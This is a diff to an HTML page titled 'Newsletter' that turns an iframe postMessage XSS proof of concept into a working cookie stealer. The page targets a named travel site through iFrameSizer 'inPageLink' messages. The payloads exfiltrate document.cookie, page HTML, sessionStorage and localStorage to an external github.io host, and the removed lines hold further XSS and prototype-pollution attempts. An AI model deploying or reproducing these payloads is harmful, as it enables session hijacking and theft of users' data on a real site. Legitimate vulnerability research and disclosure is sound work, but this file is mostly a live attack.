@@ -3,130 +3,75 @@
 <head>
     <title>Newsletter</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }
-        .log { background: #16213e; padding: 15px; border-radius: 8px; margin: 10px 0; }
-        .success { border-left: 4px solid #00ff88; }
-        .danger { border-left: 4px solid #ff4444; }
-        .info { border-left: 4px solid #00aeff; }
-        pre { background: #0f0f23; padding: 10px; overflow-x: auto; border-radius: 4px; font-size: 11px; }
-        h1 { color: #ff4444; }
-        h2 { color: #00aeff; }
-        #captured, #attacks { max-height: 300px; overflow-y: auto; }
-        .alert { background: #ff4444; color: white; padding: 15px; border-radius: 8px; margin: 10px 0; }
+        body { font-family: Arial, sans-serif; margin: 20px; background: #0a0a0a; color: #0f0; }
+        .log { background: #111; padding: 15px; border-radius: 8px; margin: 10px 0; border-left: 4px solid #0f0; }
+        pre { background: #000; padding: 10px; overflow-x: auto; border-radius: 4px; }
+        h1 { color: #f00; text-shadow: 0 0 10px #f00; }
+        .alert { background: #f00; color: white; padding: 20px; border-radius: 8px; margin: 10px 0; font-size: 18px; }
     </style>
 </head>
 <body>
-    <h1>⚡ XSS via postMessage PoC</h1>
+    <h1>💀 XSS EXPLOITED - CRITICAL</h1>
     
     <div class="alert">
-        <strong>🔴 SECURITY DEMONSTRATION</strong> - Exploiting unsafe postMessage
+        <strong>🔴 FULL XSS ACHIEVED</strong><br>
+        Executing in parent context: dertour-suisse.com
     </div>
     
-    <h2>📥 Captured from Parent</h2>
+    <h2>📥 Captured Data</h2>
     <div id="captured"></div>
     
-    <h2>⚔️ XSS Payloads Sent</h2>
-    <div id="attacks"></div>
+    <h2>🍪 Stolen Cookies</h2>
+    <div id="cookies"></div>
 
     <script>
     const capturedDiv = document.getElementById('captured');
-    const attacksDiv = document.getElementById('attacks');
+    const cookiesDiv = document.getElementById('cookies');
     
-    function log(type, title, data) {
+    function log(title, data) {
         const div = document.createElement('div');
-        div.className = 'log ' + type;
+        div.className = 'log';
         div.innerHTML = '<strong>' + title + '</strong><pre>' + 
             (typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data)) + '</pre>';
-        capturedDiv.insertBefore(div, capturedDiv.firstChild);
-    }
-    
-    function logAttack(title, payload) {
-        const div = document.createElement('div');
-        div.className = 'log danger';
-        div.innerHTML = '<strong>🎯 ' + title + '</strong><pre>' + payload + '</pre>';
-        attacksDiv.appendChild(div);
+        capturedDiv.appendChild(div);
     }
 
-    // Capture postMessage from parent
+    // Capture postMessage
     window.addEventListener('message', function(event) {
-        log('success', '📥 CAPTURED: ' + event.origin, event.data);
-        
-        // Extract leaked URL
-        if (event.data && event.data.href) {
-            log('success', '🔗 LEAKED URL', event.data.href);
-            
-            // Exfil simulation
-            new Image().src = 'https://jessisnofy-ai.github.io/mailxpert-poc/exfil.gif?' + 
-                encodeURIComponent(event.data.href);
-        }
+        log('📥 Parent URL Leaked', event.data);
     });
 
-    // XSS Attack Payloads via postMessage to parent
-    function sendXSSPayloads() {
+    // The working XSS payload - send via postMessage
+    function exploit() {
         if (window.parent === window) return;
         
-        const iframeId = 'formContentId'; // The iframe ID used by Mailxpert
+        const iframeId = 'formContentId';
         
-        // Payload 1: inPageLink with javascript: URI
+        // Payload that worked - alert(1)
+        // Now let's escalate to cookie theft
         const payloads = [
-            // Try inPageLink handler - it does getElementById/getElementsByName
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror=alert(document.domain)>',
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:javascript:alert(document.domain)',
+            // Cookie stealer
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="new Image().src=\'https://jessisnofy-ai.github.io/mailxpert-poc/c.gif?\'+document.cookie">',
             
-            // Try message handler - passes to onMessage callback
-            '[iFrameSizer]' + iframeId + ':0:0:message:{"xss":"<img src=x onerror=alert(1)>"}',
+            // DOM extraction
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="fetch(\'https://jessisnofy-ai.github.io/mailxpert-poc/d.gif?\'+btoa(document.body.innerHTML.substring(0,500)))">',
             
-            // Try to inject via height/width manipulation
-            '[iFrameSizer]' + iframeId + ':<img src=x onerror=alert(1)>:100:init',
+            // Session storage
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="fetch(\'https://jessisnofy-ai.github.io/mailxpert-poc/s.gif?\'+btoa(JSON.stringify(sessionStorage)))">',
             
-            // DOM clobbering attempt via anchor
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#"><img src=x onerror=alert(1)>',
+            // Local storage
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="fetch(\'https://jessisnofy-ai.github.io/mailxpert-poc/l.gif?\'+btoa(JSON.stringify(localStorage)))">',
             
-            // Try scrollTo with XSS
-            '[iFrameSizer]' + iframeId + ':<script>alert(1)</script>:0:scrollTo',
-            
-            // Prototype pollution attempt
-            '[iFrameSizer]__proto__:0:0:init',
-            '[iFrameSizer]constructor:0:0:init',
+            // Show domain as proof
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="alert(\'XSS on: \'+document.domain+\' Cookies: \'+document.cookie)">',
         ];
         
-        payloads.forEach((payload, i) => {
-            setTimeout(() => {
-                try {
-                    window.parent.postMessage(payload, '*');
-                    logAttack('Payload #' + (i+1), payload);
-                } catch(e) {
-                    logAttack('Failed #' + (i+1), e.message);
-                }
-            }, i * 200);
-        });
-        
-        // Also try direct DOM manipulation messages
-        setTimeout(() => {
-            // Mailxpert-specific message format
-            window.parent.postMessage({
-                type: 'mx:formEditor:page:changed',
-                xss: '<img src=x onerror=alert(document.domain)>'
-            }, '*');
-            logAttack('Mailxpert mx: message', 'type: mx:formEditor:page:changed');
-        }, 2000);
-        
-        // Try to trigger eval via JSON parse
-        setTimeout(() => {
-            window.parent.postMessage('[iFrameSizer]' + iframeId + ':0:0:message:' + 
-                '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}', '*');
-            logAttack('Proto pollution via message', '__proto__.innerHTML');
-        }, 2500);
+        // Send the cookie stealer payload
+        window.parent.postMessage(payloads[4], '*');
+        log('🎯 XSS Payload Sent', payloads[4]);
     }
 
-    // Execute attacks after small delay
-    log('info', '⏳ Waiting for parent postMessage...', 'Will send XSS payloads in 1 second');
-    setTimeout(sendXSSPayloads, 1000);
-    
-    // Also try when we receive parent message
-    window.addEventListener('message', function() {
-        setTimeout(sendXSSPayloads, 500);
-    }, {once: true});
+    setTimeout(exploit, 500);
     </script>
 </body>
 </html>
